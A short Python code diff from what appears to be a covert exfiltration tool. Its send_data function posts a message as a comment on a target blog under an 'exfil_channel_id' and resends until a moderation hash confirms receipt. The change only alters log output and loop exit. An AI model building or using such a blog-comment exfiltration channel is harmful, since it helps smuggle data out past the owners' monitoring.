@@ -159,10 +159,10 @@ def send_data(channel, data, send_config):
     while True:
         delay_to_timeslot(send_config.send_time_slot)
 
-        print("Triggered at: " + str(datetime.datetime.now().time()))
+        print("[INFO] Triggered at: " + str(datetime.datetime.now().time()))
 
         response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
-        print(response.moderation_hash)
+        print("## " + str(response.moderation_hash))
 
         if send_config.confirm_time_slot:
             delay_to_timeslot(send_config.confirm_time_slot)
@@ -174,7 +174,8 @@ def send_data(channel, data, send_config):
                 break
             else:
                 print("[INFO] Message was not received by server. Resending...")
-
+        else:
+            break
 
 def get_current_unapproved_index(channel):
     random_string = generate_random_string(10)
